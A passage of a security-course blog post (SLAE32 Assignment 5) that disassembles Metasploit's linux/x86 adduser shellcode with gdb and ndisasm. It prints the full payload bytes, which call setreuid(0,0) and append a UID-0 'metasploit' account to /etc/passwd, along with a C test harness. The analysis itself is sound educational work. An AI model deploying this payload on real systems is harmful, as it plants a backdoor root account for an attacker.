---
layout: single
title: SLAE32 Assignment 5 - Analyze Shellcode
date: 2020-08-19
classes: wide
header:
  teaser: /assets/images/SLAE32/SLAE32.jpg
tags:
  - SLAE32
  - Pentester Academy
  - Linux
  - x86
  - Shellcoding
  - x86 Shellcode Analysis 
--- 
![](/assets/images/SLAE32/SLAE32.jpg)

## SLAE32 Assignment #5 - Analyze Shellcode

<style type="text/css">
pre {
    color: white;
    background: #000000;
    border: 1px solid #ddd;
    border-left: 3px solid #f36d33;
    page-break-inside: avoid;
    font-family: Courier New;
    font-size: 16px;
    line-height: 1.6;
    margin-bottom: 1.6em;
    max-width: 100%;
    padding: 1em 1.5em;
    display: block;
    white-space: pre-wrap;
/* Since CSS 2.1 */
    white-space: -moz-pre-wrap;
/* Mozilla, since 1999 */
    white-space: -pre-wrap;
/* Opera 4-6 */
    white-space: -o-pre-wrap;
/* Opera 7 */
    word-wrap: break-word;
/* Internet Explorer 5.5+ */
}

img { 
   border:2px solid #1A1B1C;
}

</style>

<h2><span style="color:#339966;"><strong>Student ID : SLAE &nbsp;– 1314</strong></span></h2>
<h2><span style="color:#339966;"><strong><img class="wp-image-4320 aligncenter" style="border:none;" src="{{ site.baseurl }}/assets/images/2020/08/slae32-1.png" alt="SLAE32" width="265" height="265" /><br />Assignment 5 :</strong></span></h2>
<p style="text-align:justify;">In this assignment (4) four <em>shellcode</em> samples from <em>msfvenom</em> will be analysed. In this particular exercise a reversing methodology will be provided in order to identify and understand the execution mechanisms of msfvenom samples. Furthermore, according to Offensive Security site, <em>msfvenom</em> is a combination of <em>Msfpayload</em> and <em>Msfencode</em> tools, putting both into a single Framework instance. The <em>msfvenom</em> tool replaced both <em>msfpayload</em> and <em>msfencode</em> as of June 8th, 2015. The <em>msfvenom</em> tool is extremely useful for generating payloads in various formats and encoding these payloads using various encoder modules.</p>
<p style="text-align:justify;">Specifically,&nbsp; the goal of this assignment is the following</p>
<ul>
<li><strong>Take up at least three shellcode samples created with msfvenom for linux/x86</strong></li>
<li><strong>Use GDB/Ndisasm/Libemu to dissect the functionality of the shellcode&nbsp;</strong></li>
<li><strong>Present your analysis&nbsp;</strong></li>
</ul>
<blockquote class="">
<p style="text-align:justify;"><em>Disclaimer</em> :</p>
<p style="text-align:justify;"><em>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification</em></p>
</blockquote>
<blockquote class="">
<p style="text-align:justify;">The full source code and scripts can be found at <a href="https://github.com/xvass/SLAE/tree/master/Assignment5">github</a></p>
</blockquote>
<blockquote>
<p>All the development and tests have been done in the following architecture&nbsp;</p>
<p><strong>Linux kali 5.4.0-kali2-686-pae #1 SMP Debian 5.4.8-1kali1 (2020-01-06) i686 GNU/Linux&nbsp;</strong></p>
</blockquote>
<p style="text-align:justify;">Before we start the analysis we will check the list of available payloads from <strong>msfvenom</strong></p>
<pre><span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment5</b></span>#  msfvenom --list payloads | grep "linux/x86"
linux/x86/adduser Create a new user with UID 0
linux/x86/chmod Runs chmod on specified file with specified mode
linux/x86/exec Execute an arbitrary command
linux/x86/meterpreter/bind_ipv6_tcp Inject the mettle server payload (staged). Listen for an IPv6 connection (Linux x86)
linux/x86/meterpreter/bind_ipv6_tcp_uuid Inject the mettle server payload (staged). Listen for an IPv6 connection with UUID Support (Linux x86)
linux/x86/meterpreter/bind_nonx_tcp Inject the mettle server payload (staged). Listen for a connection
linux/x86/meterpreter/bind_tcp Inject the mettle server payload (staged). Listen for a connection (Linux x86)
linux/x86/meterpreter/bind_tcp_uuid Inject the mettle server payload (staged). Listen for a connection with UUID Support (Linux x86)
linux/x86/meterpreter/find_tag Inject the mettle server payload (staged). Use an established connection
linux/x86/meterpreter/reverse_ipv6_tcp Inject the mettle server payload (staged). Connect back to attacker over IPv6
linux/x86/meterpreter/reverse_nonx_tcp Inject the mettle server payload (staged). Connect back to the attacker
linux/x86/meterpreter/reverse_tcp Inject the mettle server payload (staged). Connect back to the attacker
linux/x86/meterpreter/reverse_tcp_uuid Inject the mettle server payload (staged). Connect back to the attacker
linux/x86/meterpreter_reverse_http Run the Meterpreter / Mettle server payload (stageless)
linux/x86/meterpreter_reverse_https Run the Meterpreter / Mettle server payload (stageless)
linux/x86/meterpreter_reverse_tcp Run the Meterpreter / Mettle server payload (stageless)
linux/x86/metsvc_bind_tcp Stub payload for interacting with a Meterpreter Service
linux/x86/metsvc_reverse_tcp Stub payload for interacting with a Meterpreter Service
linux/x86/read_file Read up to 4096 bytes from the local file system and write it back out to the specified file descriptor
linux/x86/shell/bind_ipv6_tcp Spawn a command shell (staged). Listen for an IPv6 connection (Linux x86)
linux/x86/shell/bind_ipv6_tcp_uuid Spawn a command shell (staged). Listen for an IPv6 connection with UUID Support (Linux x86)
linux/x86/shell/bind_nonx_tcp Spawn a command shell (staged). Listen for a connection
linux/x86/shell/bind_tcp Spawn a command shell (staged). Listen for a connection (Linux x86)
linux/x86/shell/bind_tcp_uuid Spawn a command shell (staged). Listen for a connection with UUID Support (Linux x86)
linux/x86/shell/find_tag Spawn a command shell (staged). Use an established connection
linux/x86/shell/reverse_ipv6_tcp Spawn a command shell (staged). Connect back to attacker over IPv6
linux/x86/shell/reverse_nonx_tcp Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell/reverse_tcp Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell/reverse_tcp_uuid Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell_bind_ipv6_tcp Listen for a connection over IPv6 and spawn a command shell
linux/x86/shell_bind_tcp Listen for a connection and spawn a command shell
linux/x86/shell_bind_tcp_random_port Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.
linux/x86/shell_find_port Spawn a shell on an established connection
linux/x86/shell_find_tag Spawn a shell on an established connection (proxy/nat safe)
linux/x86/shell_reverse_tcp Connect back to attacker and spawn a command shell
linux/x86/shell_reverse_tcp_ipv6 Connect back to attacker and spawn a command shell over IPv6</pre>
<p style="text-align:justify;">for the purpose of this exercise the following (4) four <em>shellcodes</em> have been chosen and analysed</p>
<ul>
<li><strong>linux/x86/adduser :</strong> create a user with UID 0</li>
<li><strong>linux/x86/exec :</strong>&nbsp; Execute an arbitrary command</li>
<li><strong>linux/x86/chmod :</strong> Runs chmod on specified file with specific mode</li>
<li><strong>linux/x86/read_file :</strong> Read up to 4096 bytes from the local file system and write it back out to the specified file descriptor</li>
</ul>
<h2><span style="color:#339966;">1st Shellcode Analysis - adduser&nbsp;</span></h2>
<p style="text-align:justify;">The first <em>shellcode</em> to analyse is the <strong>adduser</strong> system call. Before we continue with the analysis of the specified payload lets see the information provided from <strong>msfconsole</strong></p>
<pre>msf5 payload(linux/x86/exec) &gt; use payload/linux/x86/adduser
msf5 payload(linux/x86/adduser) &gt; info

Name: Linux Add User
Module: payload/linux/x86/adduser
Platform: Linux
Arch: x86
Needs Admin: Yes
Total size: 97
Rank: Normal

Provided by:
skape &lt;mmiller@hick.org&gt;
vlad902 &lt;vlad902@gmail.com&gt;
spoonm &lt;spoonm@no$email.com&gt;

Basic options:
Name Current Setting Required Description
---- --------------- -------- -----------
PASS metasploit yes The password for this user
SHELL /bin/sh no The shell for this user
USER metasploit yes The username to create

Description:
Create a new user with UID 0</pre>
<p style="text-align:justify;">As we see from the description above the <strong>adduser</strong> payload used to create a new user with UID 0. Also <strong>msfvenom</strong> gives us the option to provide our own password, shell and username. In case the default credentials and default shell are used then as seen above the username and password will be <strong>metasploit</strong> and the shell will be <strong>/bin/sh</strong>&nbsp;</p>
<p style="text-align:justify;">In order to proceed with the analysis we will first generate the payload as follows</p>
<pre><span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment5</b></span>#  msfvenom -p linux/x86/adduser -f c 
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 97 bytes
Final size of c file: 433 bytes
unsigned char buf[] = 
"\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51"
"\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63"
"\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x28\x00\x00\x00\x6d\x65"
"\x74\x61\x73\x70\x6c\x6f\x69\x74\x3a\x41\x7a\x2f\x64\x49\x73"
"\x6a\x34\x70\x34\x49\x52\x63\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a"
"\x2f\x62\x69\x6e\x2f\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58"
"\xcd\x80\x6a\x01\x58\xcd\x80";</pre>
<p style="text-align:justify;">Also, before moving further to analyse the shellcode with <strong>ndisasm</strong> we will first deploy the shellcode inside a stub file in C&nbsp; in order to be able to run it with <strong>gdb</strong></p>
<pre><span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment5</b></span># cat &lt;&lt; EOF &gt; shellcode.c
&gt; #include &lt;stdio.h&gt;
&gt; #include &lt;string.h&gt;
&gt;
&gt; unsigned char shellcode[] = $(cat adduser.c | grep -v unsigned | sed 's/"//g;s/;//g;' | sed ':a;N;$!ba;s/\n//g;s/^/"/;s/$/"/' ) ;
&gt;
&gt; int main()
&gt; {
&gt; printf("Shellcode Length: %d\n", strlen(shellcode));
&gt; int (*ret)() = (int(*)()) shellcode;
&gt; ret();
&gt; }
&gt; EOF</pre>
<p style="text-align:justify;">Afterwards we will compile the C file above in order to create the executable.</p>
<pre><span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment5</b></span># gcc -fno-stack-protector -g -z execstack -m32 -o shellcode shellcode.c</pre>
<p style="text-align:justify;">Now we are ready to run the above executable file with <strong>gdb.&nbsp;</strong></p>
<pre><span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment5</b></span># gdb -q ./shellcode
Reading symbols from ./shellcode...
gdb-peda$ b *&amp;shellcode
Breakpoint 1 at 0x4040
gdb-peda$ r
Starting program: /root/Documents/SLAE/Assignment5/shellcode
Shellcode Length:  40
[----------------------------------registers-----------------------------------]
EAX: 0x404040 --&gt; 0xcb89c931
EBX: 0x404000 --&gt; 0x3efc
ECX: 0x7fffffea
EDX: 0xb7fb0010 --&gt; 0x0
ESI: 0xb7fae000 --&gt; 0x1d6d6c
EDI: 0xb7fae000 --&gt; 0x1d6d6c
EBP: 0xbffff508 --&gt; 0x0
ESP: 0xbffff4ec --&gt; 0x4011f9 (&lt;main+80&gt;:   mov    eax,0x0)
EIP: 0x404040 --&gt; 0xcb89c931
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x40403a:    add    BYTE PTR [eax],al
   0x40403c:    add    BYTE PTR [eax],al
   0x40403e:    add    BYTE PTR [eax],al
=&gt; 0x404040 :    xor    ecx,ecx
   0x404042 &lt;shellcode+2&gt;:    mov    ebx,ecx
   0x404044 &lt;shellcode+4&gt;:    push   0x46
   0x404046 &lt;shellcode+6&gt;:    pop    eax
   0x404047 &lt;shellcode+7&gt;:    int    0x80
[------------------------------------stack-------------------------------------]
0000| 0xbffff4ec --&gt; 0x4011f9 (&lt;main+80&gt;:  mov    eax,0x0)
0004| 0xbffff4f0 --&gt; 0x1
0008| 0xbffff4f4 --&gt; 0xbffff5b4 --&gt; 0xbffff702 ("/root/Documents/SLAE/Assignment5/shellcode")
0012| 0xbffff4f8 --&gt; 0xbffff5bc --&gt; 0xbffff72d ("SHELL=/bin/bash")
0016| 0xbffff4fc --&gt; 0x404040 --&gt; 0xcb89c931
0020| 0xbffff500 --&gt; 0xbffff520 --&gt; 0x1
0024| 0xbffff504 --&gt; 0x0
0028| 0xbffff508 --&gt; 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x00404040 in shellcode ()</pre>
<p style="text-align:justify;">The above output is from <strong>gdb-peda</strong> which you can find it <a href="https://github.com/longld/peda">here. </a>At this point we will continue the analysis using the <strong><em>ndisasm </em></strong>tool in order to disassemble the shellcode</p>
<pre><span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment5</b></span>#  msfvenom -p linux/x86/adduser -f c -o adduser.c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 97 bytes
Final size of c file: 433 bytes
Saved as: adduser.c
root@kali:~/Documents/SLAE/Assignment5# res=`cat adduser.c | grep "\"" | sed 's/"//g;s/;//g' | sed ':a;N;$!ba;s/\n//g'`; echo -ne $res | ndisasm -u -
00000000  31C9              xor ecx,ecx
00000002  89CB              mov ebx,ecx
00000004  6A46              push byte +0x46
00000006  58                pop eax
00000007  CD80              int 0x80
00000009  6A05              push byte +0x5
0000000B  58                pop eax
0000000C  31C9              xor ecx,ecx
0000000E  51                push ecx
0000000F  6873737764        push dword 0x64777373
00000014  682F2F7061        push dword 0x61702f2f
00000019  682F657463        push dword 0x6374652f
0000001E  89E3              mov ebx,esp
00000020  41                inc ecx
00000021  B504              mov ch,0x4
00000023  CD80              int 0x80
00000025  93                xchg eax,ebx
00000026  E828000000        call 0x53
0000002B  6D                insd
0000002C  657461            gs jz 0x90
0000002F  7370              jnc 0xa1
00000031  6C                insb
00000032  6F                outsd
00000033  69743A417A2F6449  imul esi,[edx+edi+0x41],dword 0x49642f7a
0000003B  736A              jnc 0xa7
0000003D  3470              xor al,0x70
0000003F  3449              xor al,0x49
00000041  52                push edx
00000042  633A              arpl [edx],di
00000044  303A              xor [edx],bh
00000046  303A              xor [edx],bh
00000048  3A2F              cmp ch,[edi]
0000004A  3A2F              cmp ch,[edi]
0000004C  62696E            bound ebp,[ecx+0x6e]
0000004F  2F                das
00000050  7368              jnc 0xba
00000052  0A598B            or bl,[ecx-0x75]
00000055  51                push ecx
00000056  FC                cld
00000057  6A04              push byte +0x4
00000059  58                pop eax
0000005A  CD80              int 0x80
0000005C  6A01              push byte +0x1
0000005E  58                pop eax
0000005F  CD80              int 0x80</pre>
<p style="text-align:justify;">Furthermore, after the execution of <em><strong>ndisasm</strong></em> command we can start performing static analysis to the assembly code in order to understand which system calls are used and how. Lets start analysing the following snippet from the output above</p>
<pre><strong>xor ecx,ecx         <span style="color:#33cccc;">;zero out ecx register and sets the effective user ID to 0</span> 
mov ebx,ecx         <span style="color:#33cccc;">;zero out ebx register and sets the real user ID to 0</span>
push byte +0x46     <span style="color:#33cccc;">;push the setreuid() syscall identifier into the stack</span></strong></pre>
<p style="text-align:justify;">At the first two lines above, the <strong>xor</strong> instruction used in order to zero out the <strong>ecx</strong> and <strong>ebx</strong> registers. Then, the instruction <strong>push byte +0x46</strong> is pushing the <strong>setreuid</strong> syscall identifier on the stack. Furthermore, we can find out which system call the identifier <strong>0x46 (70 in decimal ) </strong>is referring at, by searching the header file <strong>unistd_32.h</strong>. For 32-bit x86 architecture the following command can be used</p>
<pre><span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment5</b></span># printf SYS_read | gcc -include sys/syscall.h -m32 -E -
# 1 ""
# 1 ""
# 1 ""
# 31 ""
# 1 "/usr/include/stdc-predef.h" 1 3 4
# 32 "" 2
# 1 "/usr/include/i386-linux-gnu/sys/syscall.h" 1 3 4
# 24 "/usr/include/i386-linux-gnu/sys/syscall.h" 3 4
# 1 "/usr/include/i386-linux-gnu/asm/unistd.h" 1 3 4
# 9 "/usr/include/i386-linux-gnu/asm/unistd.h" 3 4
# 1 "/usr/include/i386-linux-gnu/asm/unistd_32.h" 1 3 4
# 10 "/usr/include/i386-linux-gnu/asm/unistd.h" 2 3 4
# 25 "/usr/include/i386-linux-gnu/sys/syscall.h" 2 3 4

# 1 "/usr/include/i386-linux-gnu/bits/syscall.h" 1 3 4
# 32 "/usr/include/i386-linux-gnu/sys/syscall.h" 2 3 4
# 32 "" 2
# 1 ""

# 1 "" 3 4
3</pre>
<p style="text-align:justify;">The results above are leading us to search specific paths on the system in order to find out the header file that holds the system call identifiers for the specific architecture. As we see below we can spot the <strong>setreuid </strong>system call by searching for the system call identifier <strong>0x46 ( 70 in decimal ) </strong>inside the<strong> unistd_32.h</strong> header file.</p>
<pre><span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment5</b></span># cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep setreuid
#define __NR_setreuid 70
#define __NR_setreuid32 203</pre>
<p style="text-align:justify;">Afterwards, using the instruction <strong>pop eax</strong> , the system call identifier will be loaded into the <strong>eax</strong> register and then using the <strong>int 0x80</strong> instruction the <strong>setreuid </strong>system call will be executed.</p>
<pre><strong>pop eax      <span style="color:#33cccc;">;load the the setreuid() syscall identifier in to eax</span> 
int 0x80     <span style="color:#33cccc;">;call the setreuid() syscall identifier</span></strong></pre>
<p style="text-align:justify;">The main purpose of the <b>setreui</b><strong>d</strong> system call is that it sets both the real and the effective UID for the calling process. The prototype of the <strong>setreuid </strong>system call is as follows</p>
<pre>#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;<b><br /><br /></b>int setreuid(uid_t ruid, uid_t euid);</pre>
<p style="text-align:justify;">At this case the <strong>ecx</strong> register represents the second argument of the <strong>setreuid</strong> system call which is the <strong>euid</strong> and stands for the effective user Id and the <strong>ebx</strong> represents the first argument which is the <strong>ruid</strong> and stands for Real User Id. After using the <strong>xor</strong> instruction at the <strong>ecx</strong> register and the <strong>ebx</strong> register, the <strong>setreuid </strong>system call will be as follows</p>
<pre><strong>setreuid(0,0);</strong></pre>
<p style="text-align:justify;">The function above shall set the real and effective user IDs of the current process to zero which means the current process will run with root privileges. Lets continue with the analysis of the following code</p>
<pre><strong>push byte +0x5</strong>           <strong> <span style="color:#33cccc;">; push 0x5 in stack</span> 
pop eax                   <span style="color:#33cccc;">; load 0x5 into eax</span></strong></pre>
<p style="text-align:justify;">At the snippet above the first instruction <strong>push byte +0x5</strong>&nbsp; pushes the system call identifier <strong>0x5</strong> into the stack and then by using the <strong>pop eax </strong>instruction the same value is stored into the <strong>eax</strong> register. Moreover, after searching inside the system header <strong>unistd.h</strong> we can see that the <strong>open</strong>&nbsp;system call has the <strong>syscall</strong> identifier <strong>0x5 (5 in decimal )</strong>&nbsp;as shown below highlighted with red.</p>
<pre><span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment5</b></span># cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep " 5"
<span style="color:#ff0000;">#define __NR_open 5</span>
#define __NR_getegid 50
#define __NR_acct 51
#define __NR_umount2 52
#define __NR_lock 53
#define __NR_ioctl 54
#define __NR_fcntl 55
#define __NR_mpx 56
#define __NR_setpgid 57
#define __NR_ulimit 58
#define __NR_oldolduname 59</pre>
<p style="text-align:justify;">The <strong>open </strong>system call prototype is as follows</p>
<pre>#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;<br /><br />int open(const char *pathname, int flags);</pre>
<p style="text-align:justify;">As we see above the <strong>open</strong> system call takes two arguments, the <strong>pathname</strong> and the <strong>flags</strong>. According to the man page the <strong>open</strong> system call opens the file specified by <strong>pathname</strong>. The return value of <b>open </b>system call is a file descriptor, a small, nonnegative integer that is used in subsequent system calls ( <strong>read(2), write(2), lseek(2), fcntl(2)</strong>, etc.). The argument flags must include one of the following access modes: <strong>O_RDONLY</strong>, <strong>O_WRONLY</strong>, or <strong>O_RDWR</strong>. These request opening the file read- only, write-only, or read/write, respectively. For more information about the <strong>open</strong> system call refer to the man page <a href="https://man7.org/linux/man-pages/man2/open.2.html">here</a>&nbsp;</p>
<p style="text-align:justify;">Furthermore, based on the code snippet below the <strong>ecx</strong> register is zeroed out using the <strong>xor ecx, ecx</strong> instruction and then <strong>push ecx</strong> instruction pushes the null value on the stack in order to save if for later use regarding the second argument of the <strong>open</strong> syscall</p>
<pre><strong>xor ecx,ecx            <span style="color:#33cccc;">; zero out ecx</span> 
push ecx               <span style="color:#33cccc;">; push null on the stack</span></strong></pre>
<p style="text-align:justify;">As for the first argument of the <strong>open</strong>&nbsp;syscall there are three <strong>push</strong> instructions that will construct the pathname of the file as seen below</p>
<pre><strong>push dword 0x64777373 <span style="color:#33cccc;">; push sswd  on the stack</span> 
push dword 0x61702f2f <span style="color:#33cccc;">; push //pa  on the stack</span> 
push dword 0x6374652f </strong><span style="color:#33cccc;"><strong>; push /etc/ on the stack</strong> </span></pre>
<p style="text-align:justify;">With little help of python scripting we will convert the hex values above into ASCII text format and then the result will give us the file path ("<strong>/etc//passwd</strong>") in reverse order that will be used as the first argument of the <strong>open</strong>&nbsp;syscall.</p>
<pre>&gt;&gt;&gt; "73737764".decode("hex")
'sswd'
&gt;&gt;&gt; "2f2f7061".decode("hex")
'//pa'
&gt;&gt;&gt; "2f657463".decode("hex")
'/etc'</pre>
<p style="text-align:justify;">Then the stack pointer will point&nbsp; to "<strong>/etc//passwd</strong>" using the <strong>mov ebx, esp</strong> instruction.</p>
<pre><strong>mov ebx,esp      <span style="color:#33cccc;">;perform stack alignment in order the esp to point to "/etc/passwd"</span></strong></pre>
<p style="text-align:justify;">Later on the <strong>ecx</strong> register will be increased by one using the <strong>inc ecx</strong> instruction that will be used to set the second argument of the <strong>open</strong> syscall. As we saw before, the <strong>ecx</strong> register was assigned with the <strong>0x0</strong> value.&nbsp;</p>
<pre><strong>inc ecx          <span style="color:#33cccc;">; increase ecx register</span></strong></pre>
<p style="text-align:justify;">When increasing <strong>ecx</strong> register by one using instruction <strong>inc ecx</strong> we are masking the bits in order to have the <strong>O_WRONLY</strong> flag set. As we know the <strong>ecx</strong> register has the size of 32bits,&nbsp; the <strong>cx</strong> register has the size of 16bits, and the lower bytes <strong>cl</strong> register has the size of 8bits. Increasing the <strong>ecx</strong> register by one will change the lower 8bits <strong>cl</strong> register as follows</p>
<pre style="text-align:justify;"><strong>                       ECX</strong>
  <strong>32</strong>--------------------------------------------
                                    <strong>CX</strong>
    --------------------<strong>16</strong>----------------------
                              <strong>CH</strong>          <span style="color:#ff0000;"><strong>CL</strong></span>
    ---------------------<strong>8</strong>-----------<span style="color:#ff0000;"><strong>8</strong></span>----------
    00000000  00000000      00000000   <span style="color:#ff0000;">00000000</span>

  + 00000000  00000000      00000000   <span style="color:#ff0000;">00000001</span>
    --------------------------------------------
    00000000  00000000      00000000   <span style="color:#ff0000;">00000001
</span>
                                       <span style="color:#ff0000;">O_WRONLY</span></pre>
<p style="text-align:justify;">If we convert the binary value <strong>00000001</strong>&nbsp;to decimal we have the following <strong>2^0 = 1. </strong>Then converting the value from decimal to octal we also get <strong>00000001 .</strong>As we see from the <em><strong>fcntl.h</strong></em> header file below, the <strong>oflag</strong> that has the defined octal value <strong>00000001</strong>&nbsp;is the <strong>O_WRONLY</strong>.</p>
<pre><span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment5</b></span># grep -i -n "O_WRONLY" /usr/include/asm-generic/fcntl.h
21:#define O_WRONLY 00000001</pre>
<p style="text-align:justify;">Moving further to the next instruction as we see at the snippet below, the immediate value <strong>0x4</strong> will be assigned at the higher bits <strong>ch</strong> register</p>
<pre><strong>mov ch,0x4      <span style="color:#33cccc;">;  move the immediate value of 0x4 to ch register</span></strong></pre>
<p style="text-align:justify;">This means that from the <strong>cx</strong> register which has the size of 16bits, the first 8bits consisting the <strong>ch</strong> register will be changed with the following binary value <strong>00000100</strong></p>
<pre><strong>                     ECX</strong>
<strong>32</strong>--------------------------------------------
<strong>                                  CX</strong>
----------------------<strong>16</strong>----------------------  
<span style="color:#ff0000;"><strong>                             CH</strong></span>        <strong>CL</strong>
-----------------------<span style="color:#ff0000;"><strong>8</strong></span>-----------<strong>8</strong>---------- 
  00000000  00000000      <span style="color:#ff0000;">00000000</span>    00000000 
+ 00000000  00000000      <span style="color:#ff0000;">00000000</span>    00000001 
---------------------------------------------- 
  00000000  00000000      00000<span style="color:#ff0000;">100</span>    <span style="color:#ff0000;">00000001
</span>----------------------------------------------
                     
                     <span style="color:#33cccc;">ECX </span>
       000000000000000000000<span style="color:#ff0000;">1</span>000000000<span style="color:#ff0000;">1
                           2^10      2^0

</span>                         <span style="color:#ff0000;">O_APPEND</span>  <span style="color:#ff0000;">O_WRONLY</span><code class=" language-nasm">
</code></pre>
<p style="text-align:justify;">Currently the <strong>ecx</strong> register holds the hex value <strong>0x401</strong>. Furthermore, at the <strong>ecx</strong> register starting from the <strong>least significant bit</strong> <strong>(LSB)</strong> and counting by one to the <strong>most significant bit (MSB)</strong>,&nbsp; the <strong>10th</strong> bit appears to be one (1) meaning that if we convert it to decimal we get <strong>2^10 = 1024 ,</strong>where in hex representation we get the value <strong>0x400</strong> and in octal representation we get the value<strong> 00002000.</strong> Furthermore, as we see from the <strong>fcntl.h</strong> header file below, the <strong>O_APPEND</strong>&nbsp;has been defined with the octal value <strong>00002000</strong></p>
<pre><span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment5</b></span># grep -i -n "00002000"  /usr/include/asm-generic/fcntl.h
36:#define O_APPEND 00002000</pre>
<p style="text-align:justify;">According to <strong>open</strong> system call man page we get the following information.</p>
<ul>
<li style="text-align:justify;"><strong>O_APPEND&nbsp; :&nbsp; </strong>The file is opened in append mode.</li>
<li><strong>O_WRONLY : </strong>Open for writing only.</li>
</ul>
<p style="text-align:justify;">Using <strong>gdb</strong> we can get the following results</p>
<pre>gdb-peda$ p/t $cl
$18 = <span style="color:#ff0000;">1</span>
gdb-peda$ p/t $ch
$19 = <span style="color:#ff0000;">100</span>
gdb-peda$ p/t $ecx
$20 = <span style="color:#ff0000;">10000000001</span>
gdb-peda$
gdb-peda$ p/t  $cx
$21 = <span style="color:#ff0000;">10000000001 <strong><span style="color:#33cccc;">&lt;- 0x401</span></strong></span>
gdb-peda$</pre>
<p style="text-align:justify;">Finally, the <strong>open</strong>&nbsp;syscall will be called using the following instruction</p>
<pre><strong>int 0x80  <span style="color:#33cccc;">     ; call open syscall</span></strong></pre>
<p style="text-align:justify;">At this point the <strong>open</strong>&nbsp;syscall will be set as follows</p>
<pre><strong>open( "/etc//passwd", O_WRONLY | O_APPEND );</strong></pre>
<p style="text-align:justify;">The next instruction <strong>xchg ebx,eax</strong>&nbsp;is used in order to exchange the values between the two registers the <strong>ebx</strong> and <strong>eax. </strong>At this point the file descriptor returned by the <strong>open </strong>instruction will be saved in<strong> ebx </strong>register.</p>
<pre><strong>xchg ebx,eax   <span style="color:#33cccc;">; exchange the values between ebx and eax. Save the file descriptor to ebx to use it later in write syscall</span></strong></pre>
<p style="text-align:justify;">As we see at the code snippet below the execution flow will be redirected at offset <strong>0x53 </strong>from the beginning of the shellcode</p>
<pre><strong>call 0x53      </strong><span style="color:#33cccc;"><strong>; redirect execution flow at offset 0x53</strong> </span></pre>
<p style="text-align:justify;">The <strong>call</strong> instruction performs two operations:</p>
<ol>
<li>It pushes the return address (address immediately after the <strong>call</strong> instruction) on the stack.</li>
<li>It changes <strong>eip</strong> to the call destination. This effectively transfers control to the call target and begins execution there.</li>
</ol>
<p style="text-align:justify;">Having in mind these two operations of the <strong>call</strong> instruction, it is interesting to check <strong>gdb-peda</strong> about the return address that pushed on the stack.</p>
<pre>0x00404066 &lt;+38&gt;: call 0x404090 &lt;shellcode+80&gt;
<strong>0x0040406b</strong> &lt;+43&gt;: ins DWORD PTR es:[edi],dx</pre>
<p style="text-align:justify;">Afterwards, and when the execution flow redirected at address <strong>0x404090, </strong>by checking that address<strong>&nbsp;</strong>we see the string highlighted in red below.</p>
<pre>gdb-peda$ p/x $esp
$40 = 0xbffff4d8
gdb-peda$ p/s *0xbffff4d8
$41 = 0x40406b
gdb-peda$ x/-s 0x40406b
<strong>0x40406b</strong> &lt;shellcode+43&gt;: "<span style="color:#ff0000;">metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh</span><span style="color:#33cccc;">\n</span>Y\213Q\374j\004X\315\200j\001X\315\200"
gdb-peda$</pre>
<p style="text-align:justify;">Also as seen above the valid string is terminated with the <strong>'\n'</strong> new line character which separates it from the rest invalid characters. Furthermore, analysing the code using <strong>gdb</strong> we can see the following hexadecimal values in red colour below starting from the address <strong>0x40406b</strong></p>
<pre>gdb-peda$ <strong>x/42x 0x40406b</strong>
0x40406b &lt;shellcode+43&gt;: <span style="color:#ff0000;">0x6d 0x65 0x74 0x61 0x73 0x70 0x6c 0x6f</span>
0x404073 &lt;shellcode+51&gt;:<span style="color:#ff0000;"> 0x69 0x74 0x3a 0x41 0x7a 0x2f 0x64 0x49</span>
0x40407b &lt;shellcode+59&gt;: <span style="color:#ff0000;">0x73 0x6a 0x34 0x70 0x34 0x49 0x52 0x63</span>
0x404083 &lt;shellcode+67&gt;: <span style="color:#ff0000;">0x3a 0x30 0x3a 0x30 0x3a 0x3a 0x2f 0x3a</span>
0x40408b &lt;shellcode+75&gt;: <span style="color:#ff0000;">0x2f 0x62 0x69 0x6e 0x2f 0x73 0x68 0x0a</span>
0x404093 &lt;shellcode+83&gt;: <span style="color:#ff0000;">0x59 0x8b</span></pre>
